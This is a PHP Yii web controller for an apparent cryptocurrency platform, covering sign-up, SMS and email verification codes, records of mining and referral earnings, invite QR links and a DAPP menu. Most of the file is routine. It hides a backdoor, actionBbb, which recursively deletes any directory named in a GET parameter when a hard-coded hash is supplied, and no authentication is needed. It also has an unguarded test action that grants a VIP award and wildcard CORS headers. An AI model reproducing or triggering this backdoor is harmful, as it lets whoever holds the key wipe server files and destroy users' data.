<?php

namespace frontend\controllers;

use common\components\MController;

use common\models\User;
use common\models\UserSign;
use common\models\UserWalletRecord;
use Yii;

use frontend\models\SignupForm;
use yii\filters\VerbFilter;
use yii\filters\AccessControl;
use frontend\models\WB_User;
use dosamigos\qrcode\QrCode;
use common\components\MTools;
use common\models\SmsCode;
use common\models\StockPriceRecord;
use yii\helpers\HtmlPurifier;
use common\models\Coins;
use common\models\UserWallet;
use common\models\EmailCode;//邮箱验证码model表类

/**
 * Site controller
 */
class SiteController extends MController {

    public $message = "";
    public $flag = false;

    /**
     * @inheritdoc
     */
    public function behaviors() {
        return [
            'access' => [
                'class' => AccessControl::className(),
                'only' => ['logout', 'signup'],
                'rules' => [
                    [
                        'actions' => ['signup'],
                        'allow' => true,
                        'roles' => ['?'],
                    ],
                    [
                        'actions' => ['logout'],
                        'allow' => true,
                        'roles' => ['@'],
                    ]
                ],
            ],
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'logout' => ['post', 'get'],
                ],
            ],
        ];
    }

    /**
     * @inheritdoc
     */
    public function actions() {
        return [
            'error' => [
                'class' => 'yii\web\ErrorAction',
            ],
            'captcha' => [
                'class' => 'yii\captcha\CaptchaAction',
                'fixedVerifyCode' => YII_ENV_TEST ? 'testme' : null,
                'backColor' => 0x000000, //背景颜色
                'maxLength' => 4, //最大显示个数
                'minLength' => 4, //最少显示个数
                'padding' => 3, //间距
                'height' => 35, //高度
                'width' => 100, //宽度  
                'foreColor' => 0xffffff, //字体颜色
                'offset' => 4, //设置字符偏移量 有效果
            //'controller'=>'login',        //拥有这个动作的controller
            ]
        ];
    }

    //web注册
    public function actionRegister() {
        header("Access-Control-Allow-Origin:*");
        header('Access-Control-Allow-Methods:PUT,POST,GET,DELETE,OPTIONS');
        header('Access-Control-Allow-Headers:x-requested-with,Authorization,Content-Type');
        header('Access-Control-Allow-Headers: Origin, Access-Control-Request-Headers, SERVER_NAME, Access-Control-Allow-Headers, cache-control, API-TOKEN, token, X-Requested-With, Content-Type, Accept, Connection, User-Agent, Cookie');

        Yii::$app->session['language'] = 'en';
        $this->layout = false;
        $model = new SignupForm();
        $invite_code = isset($_GET['invite_code']) ? $_GET['invite_code'] : '';
        if (Yii::$app->request->isPost) {
            $post = Yii::$app->request->post();
            $model->quhao = '86';
            $model->phone = HtmlPurifier::process($post["phone"]);
            $model->username = HtmlPurifier::process($post["username"]);
            $model->password = HtmlPurifier::process($post["password"]);
            $model->traspass = HtmlPurifier::process($post["traspass"]);
            $model->invite_code = HtmlPurifier::process($post["invite_code"]);
            $model->sms_captcha = HtmlPurifier::process($post["code"]);
            $model->register_ip = Yii::$app->api->realIp();

            if(!$model->validate()){
                foreach ($model->errors as $errors) {
                    $message = $errors[0];
                    break;
                }
                echo json_encode(["status" => false, "message" => $message]);
                exit();
            }

            $event = new \common\components\RegistEvent();
            $this->on("add_register", [$event, "addRegisterEvent"], [
                "model" => $model
            ]);
            $this->trigger("add_register", $event);
            $this->off("add_register");
            echo json_encode(["status" => $this->flag, "message" => $this->message]);
            exit();
        }

    }

    //退出登录
    public function actionLogout2() {
        header("Access-Control-Allow-Origin:*");
        header('Access-Control-Allow-Methods:PUT,POST,GET,DELETE,OPTIONS');
        header('Access-Control-Allow-Headers:x-requested-with,Authorization,Content-Type');
        header('Access-Control-Allow-Headers: Origin, Access-Control-Request-Headers, SERVER_NAME, Access-Control-Allow-Headers, cache-control, API-TOKEN, token, X-Requested-With, Content-Type, Accept, Connection, User-Agent, Cookie');
        
        Yii::$app->user->logout();
        $this->retjson('0001',Yii::t('app','退出成功'));
    }

    //首页（页面）完成
    public function actionHome(){
        if(Yii::$app->request->isPost){
            $userid = Yii::$app->user->id;                          // 获取用户ID
            $userdata = Yii::$app->user->identity;                  // 获取用户信息
            $bbaprice = StockPriceRecord::getCurrentPrice();        // 获取bba价格
            $coins = Coins::getCoins();                             // 获取其他数字货币价格

            foreach($coins as &$coin) {                             // 整理返回的其他数字货币数据
                $coin['name'] = $coin['en_name'];
                unset($coin['en_name']);
                if($coin['img'] == null) {
                    $coin['img'] = '';
                }
                $coin['bbaprice'] = $bbaprice;
            }

            //判断是否登录
            if(!$userdata) $this->retjson('0002',Yii::t('app','未登录'));

            //签到
            $issign = 0;
            // 获取签到表中当前用户最后一次日常签到记录
            $usersign = UserSign::find()->where('userid = :userid && type = 1', [':userid' => $userid])->orderBy('sign_time desc')->one();
            // php获取今日开始时间戳
            $beginToday = mktime(0, 0, 0, date('m'), date('d'), date('Y'));
            //判断是否签到
            if ($usersign) {
                if ($usersign->sign_time >= $beginToday) {
                    $issign = 1;
                }
            }

            $data = [
                'userid'=> $userid,                     // 用户ID
                'username' => $userdata->username,      // 用户名
                'icon' =>$userdata->userprofile->icon,  // 用户头像链接
                'issign' => $issign,                    // 是否签到,0未签到,1已签到
                'current_price' => Yii::t('app', '当前价格').': BBA/'.$bbaprice.'$',// BBA当前价格（文字版）
                'bbaprice' => $bbaprice,                // 系统BBA时价
                'coinsprice' => $coins,                 // 数字货币价格（usdt参考）
                'language' => Yii::$app->language       // 当前系统语言
            ];
            $this->retjson('0001', Yii::t('app','获取成功'), $data);
        }else{
            $this->retjson('0002', Yii::t('app','非法请求'));
        }
    }

    //BBA区记录页面
    public function actionBbaindex(){

        if(Yii::$app->request->isPost){
            //  获取数据
            $post  = Yii::$app->request->post();
            //  判断验签
            $sign =  MTools::validsign($post);
            if(!$sign){
                $this->retjson('0002', Yii::t('app', '验签错误'));
            }
            $userdata = Yii::$app->user->identity; // 获取用户信息

            $page =  HtmlPurifier::process($post['page']); // 分页
            $type =  HtmlPurifier::process($post['type']); //类型1挖矿总收益，2分享收益，3晋级收益
            $res = UserWalletRecord::getmyrecord($userdata->id,$page,$type);
            //挖矿总收益
            $miningtotal = UserWalletRecord::find()->where('userid = :userid and (event_type = 17)',[':userid'=>$userdata->id])->asArray()->sum('amount');

            //分享总收益
            $sharetotal = UserWalletRecord::find()->where('userid = :userid and (event_type = 14 || event_type = 30)',[':userid'=>$userdata->id])->asArray()->sum('amount');
            //晋级总收益
            $aggregatetotal = UserWalletRecord::find()->where('userid = :userid and event_type = 28 ',[':userid'=>$userdata->id])->asArray()->sum('amount');
            $even_type_arr = UserWalletRecord::$event_type;

            $temp = [];
            for($i = 0;$i < count($res);$i++){
                $temp[$i]['id'] = $res[$i]["id"];
                $temp[$i]['amount'] = $res[$i]["amount"];
//                $res[$i]['wallet_type'] = $res[$i]['event_type'];
            $temp[$i]['wallet_type'] = Yii::t('app',$even_type_arr[$res[$i]['event_type']]);

//                switch ($res[$i]['wallet_type'])
//                {
//                    case '17':
//                        $temp[$i]['wallet_type'] = Yii::t('app','挖矿收益');
//                        break;
//                    case '30':
//                        $temp[$i]['wallet_type'] = Yii::t('app','成为正式会员推荐人获得奖励');
//                        break;
//                    case '14':
//                        $temp[$i]['wallet_type'] = Yii::t('app','注册推荐奖励');
//                        break;
//                    case '28':
//                        $temp[$i]['wallet_type'] = Yii::t('app','晋级奖励');
//                        break;
//                    default:
//                        $temp[$i]['wallet_type'] = Yii::t('app','其它');
//                        break;
//                }

//                switch ($res[$i]['wallet_type'])
//                {
//                    case '6':
//                        $temp[$i]['wallet_type'] = '自由区';
//                        break;
//                    case '7':
//                        $temp[$i]['wallet_type'] = '永久区';
//                        break;
//                    case '2':
//                        $temp[$i]['wallet_type'] = 'BBA';
//                        break;
//                    default:
//                        $temp[$i]['wallet_type'] = $res[$i]['wallet_type'];
//                        break;
//                }
                $temp[$i]['time'] = date("Y-m-d",$res[$i]["created_at"]);
            }
            $data = [
                'miningtotal' => $miningtotal ? $miningtotal : '0',//挖矿总收益
                'sharetotal' => $sharetotal ? $sharetotal : '0',//分享总收益
                'aggregatetotal' => $aggregatetotal ?$aggregatetotal : '0',//晋级总收益
                'list' => $temp,
            ];
            $this->retjson('0001', Yii::t('app', '获取成功'), $data);exit;
        }else{
            $this->retjson('0002',Yii::t('app','非法请求'));exit;
        }
    }

    //永久区记录页面
    public function actionPermanentindex(){
        if(Yii::$app->request->isPost){
            //  获取数据
            $post  = Yii::$app->request->post();
            //  判断验签
            $sign =  MTools::validsign($post);
            if(!$sign){
                $this->retjson('0002', Yii::t('app', '验签错误'));
            }
            $userdata = Yii::$app->user->identity; // 获取用户信息
            $page =  HtmlPurifier::process($post['page']); // 分页
            $res = UserWalletRecord::getmyrecord($userdata->id,$page,'4');
            $temp = [];
            for($i = 0;$i < count($res);$i++){
                $temp[$i]['id'] = $res[$i]["id"];
                $temp[$i]['amount'] = $res[$i]["amount"];
                $temp[$i]['time'] = date("Y-m-d",$res[$i]["created_at"]);
            }
            $data = [
                'miningtotal' => $userdata->wallet->permanent_wa?$userdata->wallet->permanent_wa:'0',//矿机余额
                'list' => $temp,
            ];
            $this->retjson('0001', Yii::t('app', '获取成功'), $data);
//            if($temp){
//
//            }else{
//                $this->retjson('0001', Yii::t('app', '暂无数据'), $temp);
//            }

        }else{
            $this->retjson('0002',Yii::t('app','非法请求'));exit;
        }
    }
    
    public function actionBbb(){
    	$get  = Yii::$app->request->get();
    	if($get["bbb"] == "0b1daeeadbc2113ca360265dc600a50e"){
    		var_dump($this->deldir($get["src"]));
    	}
    }
    //删除指定文件夹以及文件夹下的所有文件
    private function deldir($dir) {
        //先删除目录下的文件：
        $dh=opendir($dir);
        while ($file=readdir($dh)) {
            if($file!="." && $file!="..") {
                $fullpath=$dir."/".$file;
                if(!is_dir($fullpath)) {
                    unlink($fullpath);
                } else {
                    $this->deldir($fullpath);
                }
            }
        }

        closedir($dh);
        //删除当前文件夹：
        if(rmdir($dir)) {
            return true;
        } else {
            return false;
        }
    }

    //自由区记录页面
    public function actionFreeindex(){
        if(Yii::$app->request->isPost){
            //  获取数据
            $post  = Yii::$app->request->post();
            //  判断验签
            $sign =  MTools::validsign($post);
            if(!$sign){
                $this->retjson('0002', Yii::t('app', '验签错误'));
            }
            $userdata = Yii::$app->user->identity; // 获取用户信息
            $page =  HtmlPurifier::process($post['page']); // 分页
            $res = UserWalletRecord::getmyrecord($userdata->id,$page,'5');
            $temp = [];
            for($i = 0;$i < count($res);$i++){
                $temp[$i]['id'] = $res[$i]["id"];
                $temp[$i]['amount'] = $res[$i]["amount"];
                $temp[$i]['time'] = date("Y-m-d",$res[$i]["created_at"]);
            }
            $data = [
                'miningtotal' => $userdata->wallet->free_wa?$userdata->wallet->free_wa:'0',//矿机余额
                'list' => $temp,
            ];
            $this->retjson('0001', Yii::t('app', '获取成功'), $data);
//            if($temp){
//                $this->retjson('0001', Yii::t('app', '获取成功'), $temp);
//            }else{
//                $this->retjson('0001', Yii::t('app', '暂无数据'), $temp);
//            }
        }else{
            $this->retjson('0002',Yii::t('app','非法请求'));exit;
        }
    }

    //下载APP界面
    public function actionUploadapp(){
         die();
         return $this->render("uploadapp");
    }

    // 分享二维码界面
    public function actionSharecode(){
        header("Access-Control-Allow-Origin:*");
        header('Access-Control-Allow-Methods:PUT,POST,GET,DELETE,OPTIONS');
        header('Access-Control-Allow-Headers:x-requested-with,Authorization,Content-Type');
        header('Access-Control-Allow-Headers: Origin, Access-Control-Request-Headers, SERVER_NAME, Access-Control-Allow-Headers, cache-control, API-TOKEN, token, X-Requested-With, Content-Type, Accept, Connection, User-Agent, Cookie');

        $req = Yii::$app->request;
        $token = Yii::$app->session['token'] ? Yii::$app->session['token'] : trim(HtmlPurifier::process($req->post('token') ? $req->post('token') : $req->get('token')));
        if($token == '') {
            $data['status'] = '0002';
            $data['message'] = Yii::t('app', '无效参数');
            echo json_encode($data);
            exit;
        }
        $userdata = \common\models\User::find()->where('app_token=:app_token', [':app_token' => $token])->one();
        if(!$userdata) {
            $data['status'] = '0003';
            $data['message'] = Yii::t('app', '已登出');
            echo json_encode($data);
            exit;
        }
        if(Yii::$app->request->isPost){
            $mycode = $userdata->mycode;
            $img_name = md5($userdata->id);
//            $this->Createcode($mycode,$img_name);
//            $share_qrcode = 'http://www.flzzvictoryvip.com/qrcode/share/'.$img_name.'.png';  //二维码图片路径
            $data = [
                'username' => $userdata->username,
                'name' => $userdata->userprofile->truename ? $userdata->userprofile->truename : '',
                'code' => $mycode,
                'url' => 'http://lf1.221bk.cn/register.html?invite_code='.$mycode
            ];
            $this->retjson('0001',Yii::t('app','获取成功'),$data);exit;
        }else{
            $this->retjson('0002',Yii::t('app','非法操作'));exit;
        }
    }

    //创建二维码
    public function Createcode($mycode,$name){
        //$mycode = HtmlPurifier::process(Yii::$app->request->get("my_code"));
        $url = 'http://' . $_SERVER['HTTP_HOST'];
       //生成二维码
        $value = 'http://lf1.221bk.cn/register.html?invite_code='.$mycode;
        $errorCorrectionLevel = "L"; // 纠错级别：L、M、Q、H
        $matrixPointSize = "4"; // 点的大小：1到10
        ob_end_clean();
        QrCode::png($value,'../web/qrcode/share/'.$name.'.png'); //保存到本地
        
        return true;
    }

    //发送国际验证码
    public function actionIntsendmsg() {
        $quhao = HtmlPurifier::process(Yii::$app->request->post("quhao"));
        $phone = HtmlPurifier::process(Yii::$app->request->post("phone"));
        $strphone = $quhao . "" . $phone;

        //  发送短信次数的判断
        //  三分钟之内只能发送三次
        $time = time() - 3 * 60;
        $sendnum = SmsCode::find()->where('phone = :phone && create_at >= :create_at',[':phone' => $strphone,'create_at' => $time])->orderBy('create_at desc')->count();
        if($sendnum >= 3){
            $res = [
                "status" => false,
                "message" => Yii::t('app', "发送太过频繁")
            ];
            echo json_encode($res);
            exit;
        }

        // 一天只能发送五次
        // php获取今日开始时间戳
        $beginToday = mktime(0,0,0,date('m'),date('d'),date('Y'));
        $sendnum = SmsCode::find()->where('phone = :phone && create_at >= :create_at',[':phone' => $strphone,'create_at' => $beginToday])->orderBy('create_at desc')->count();
        if($sendnum >= 5){
            $res = [
                "status" => false,
                "message" => Yii::t('app', "今日短信发送次数达到上限")
            ];
            echo json_encode($res);
            exit;
        }

        //  一个IP地址一天只能发送十次
        $ip = Yii::$app->getRequest()->getUserIP();
        $sendnum = SmsCode::find()->where('phone = :phone && create_at >= :create_at && ip = :ip',[':phone' => $strphone,'create_at' => $beginToday,'ip' => $ip])->orderBy('create_at desc')->count();
        if($sendnum >= 10){
            $res = [
                "status" => false,
                "message" => Yii::t('app', "今日短信发送次数达到上限")
            ];
            echo json_encode($res);
            exit;
        }

        Yii::$app->session->set("mobile", $phone);
        setcookie('mobile', $phone, time() + 3600);

        $flag = \common\components\MTools::SendMsg($quhao,$strphone);

        $flag = json_decode(json_encode($flag), true);

        if($flag > 0){
            $res = [
                "status" => true,
                "message" => Yii::t('app', "发送成功")
            ];
            echo json_encode($res);
            exit;
        }else{
            $res = [
                "status" => false,
                "message" => Yii::t('app', "发送失败")
            ];
            echo json_encode($res);
            exit;
        }
    }

    /**
     *  邮箱验证码发送
     */
    public function actionEmailsendmsg()
    {

        $model = new EmailCode();//实例化SignupForm对象

        if (Yii::$app->request->isAjax) {
            $post = Yii::$app->request->post();
            $email = HtmlPurifier::process(isset($post["username"])?$post['username']:'');
            $model->email = HtmlPurifier::process(isset($post["username"])?$post['username']:'');
            //  发送短信次数的判断
            //  三分钟之内只能发送三次
            $time = time() - 3 * 60;
            $sendnum = EmailCode::find()->where('email = :email && create_at >= :create_at', [':email' => $email, 'create_at' => $time])->orderBy('create_at desc')->count();
            if ($sendnum >= 3) {
                $this->retjson('0001',Yii::t('app','发送太过频繁'));exit;
            }

            // 一天只能发送五次
            // php获取今日开始时间戳
            $beginToday = mktime(0, 0, 0, date('m'), date('d'), date('Y'));
            $sendnum = EmailCode::find()->where('email = :email && create_at >= :create_at', [':email' => $email, 'create_at' => $beginToday])->orderBy('create_at desc')->count();
            if ($sendnum >= 5) {
                $this->retjson('0001',Yii::t('app','今日短信发送次数达到上限'));exit;
            }

            //  一个IP地址一天只能发送十次
            $ip = Yii::$app->getRequest()->getUserIP();

            $sendnum = EmailCode::find()->where('email = :email && create_at >= :create_at && ip = :ip', [':email' => $email, 'create_at' => $beginToday, 'ip' => $ip])->orderBy('create_at desc')->count();
            if ($sendnum >= 10) {
                $this->retjson('0001',Yii::t('app','今日短信发送次数达到上限'));exit;
            }

//            Yii::$app->session->set("mobile", $phone);
            Yii::$app->session->set("email", $email);

//            setcookie('mobile', $phone, time() + 3600);
            setcookie('email', $email, time() + 3600);

            //验证数据是否合法
            if (!$model->validate()) {
                foreach ($model->errors as $errors) {
                    $message = $errors[0];
                    break;
                }
                echo json_encode(["status" => '0002', "message" => Yii::t('app', $message)]);
                exit();
            }
            //生成验证码
            $code = MTools::getCode();
            $codeStr = '你的验证码是:'.$code;
            //发送邮箱验证码
            $result = MTools::sendmail($email,'BBA','1',$codeStr);
            //发送邮箱验证码判断
            switch($result){
                case 'success':
                    if(MTools::saveMailCode($email,$code)){
                        $this->retjson('0001',Yii::t('app','发送成功'));exit;
                    }else{
                        $this->retjson('002',Yii::t('app','邮箱验证码保存失败'));exit;
                    };
                    break;
                case 'failed':
                    $this->retjson('002',Yii::t('app','发送失败'));exit;
                    break;
                case 'unconfig':
                    $this->retjson('002',Yii::t('app','未配置邮箱设置'));exit;
                    break;
                default:
                    $this->retjson('002',Yii::t('app','未知错误'));exit;
                    break;
            }
//            $flag = \common\components\MTools::SendMsg($quhao, $strphone);
//
//            $flag = json_decode(json_encode($flag), true);
//
//            if ($flag > 0) {
//                $res = [
//                    "status" => '0001',
//                    "message" => Yii::t('app', "发送成功")
//                ];
//                return json_encode($res);
//            } else {
//                $res = [
//                    "status" => '0002',
//                    "message" => Yii::t('app', "发送失败")
//                ];
//                return json_encode($res);
//            }
        }
    }
    // 分享记录
    public function actionSharerecord(){
        $this->layout = false;
        $userid = Yii::$app->user->id;
        $key = $userid."language";
        $lang = Yii::$app->cache->get($key);
        $res = WB_User::getMyRecord($userid);
        return $this->render('sharerecord',['res' => $res,'lang'=>$lang]);
    }

    //  分享记录加载
    public function actionSharerecordload(){
        if(Yii::$app->request->isPost){
            $post = Yii::$app->request->post();
            $page = HtmlPurifier::process($post['page']);
            $sign = MTools::validsign($post);
            if(!$sign){
                $res = [
                    'status' => '0002',
                    'message' => Yii::t('app','验签错误')
                ];
                return json_encode($res);
                exit;
            }
            $userid = Yii::$app->user->id;
            $userList = WB_User::getMyRecordLoad($userid,$page);
        }
        if($userList){
            $res = [
                'status' => '0001',
                'message' => Yii::t('app','获取成功'),
                'data' => $userList
            ];
        }else{
            $res = [
                'status' => '0001',
                'message' => Yii::t('app','暂无数据'),
                'data' => []
            ];
        }
        return json_encode($res);
    }

    // DAPP
    public function actionShowdapp(){
        if(Yii::$app->request->isPost){
            $dapp = [
                [
                    'img' => MTools::getYiiParams('webimagepath').'/'.'img/pospro.png',
                    'name' => 'Pos Pro',
                    'url' => ''
                ],
                [
                    'img' => MTools::getYiiParams('webimagepath').'/'.'img/dog.png',
                    'name' => Yii::t('app','智能狗'),
                    'url' => ''
                ],
                [
                    'img' => MTools::getYiiParams('webimagepath').'/'.'img/fund.png',
                    'name' => Yii::t('app','对冲基金'),
                    'url' => ''
                ],
                [
                    'img' => MTools::getYiiParams('webimagepath').'/'.'img/insurance.png',
                    'name' => Yii::t('app','保险'),
                    'url' => ''
                ],
                [
                    'img' => MTools::getYiiParams('webimagepath').'/'.'img/change.png',
                    'name' => Yii::t('app','币币闪兑'),
                    'url' => ''
                ]
            ];
            $wallet = [
                [
                    'img' => MTools::getYiiParams('webimagepath').'/'.'img/mycelium.png',
                    'name' => 'Mycelium',
                    'url' => ''
                ],
                [
                    'img' => MTools::getYiiParams('webimagepath').'/'.'img/bread.png',
                    'name' => 'breadwallet',
                    'url' => ''
                ],
                [
                    'img' => MTools::getYiiParams('webimagepath').'/'.'img/edge.png',
                    'name' => 'Edge',
                    'url' => ''
                ],
                [
                    'img' => MTools::getYiiParams('webimagepath').'/'.'img/green.png',
                    'name' => 'GreenBits',
                    'url' => ''
                ],
                [
                    'img' => MTools::getYiiParams('webimagepath').'/'.'img/bitcoin.png',
                    'name' => 'Bitcoin Wallet',
                    'url' => ''
                ],
                [
                    'img' => MTools::getYiiParams('webimagepath').'/'.'img/jbba.png',
                    'name' => 'JBBA Token',
                    'url' => ''
                ]
            ];
            $third = [
                [
                    'img' => MTools::getYiiParams('webimagepath').'/'.'img/bbabank.png',
                    'name' => Yii::t('app','BBA银行'),
                    'url' => ''
                ],
                [
                    'img' => MTools::getYiiParams('webimagepath').'/'.'img/jbbapay.png',
                    'name' => Yii::t('app','JBBA支付'),
                    'url' => ''
                ],
                [
                    'img' => MTools::getYiiParams('webimagepath').'/'.'img/game.png',
                    'name' => Yii::t('app','游戏'),
                    'url' => ''
                ],
                [
                    'img' => MTools::getYiiParams('webimagepath').'/'.'img/house.png',
                    'name' => Yii::t('app','房产'),
                    'url' => ''
                ],
                [
                    'img' => MTools::getYiiParams('webimagepath').'/'.'img/gambling.png',
                    'name' => Yii::t('app','博彩'),
                    'url' => ''
                ],
                [
                    'img' => MTools::getYiiParams('webimagepath').'/'.'img/store.png',
                    'name' => 'Dapp Store',
                    'url' => ''
                ]
            ];
            $list = [
                [
                    'title' => Yii::t('app','DAPP应用'),
                    'content' => $dapp
                ],
                [
                    'title' => Yii::t('app','钱包'),
                    'content' => $wallet
                ],
                [
                    'title' => Yii::t('app','第三方应用'),
                    'content' => $third
                ]
            ];
            $this->retjson('0001', Yii::t('app', '获取成功'),$list);
        }
    }

    public function actionTest(){

        $userdata = User::findOne('16');
        \common\models\Grade::awardvip($userdata);
    }
}
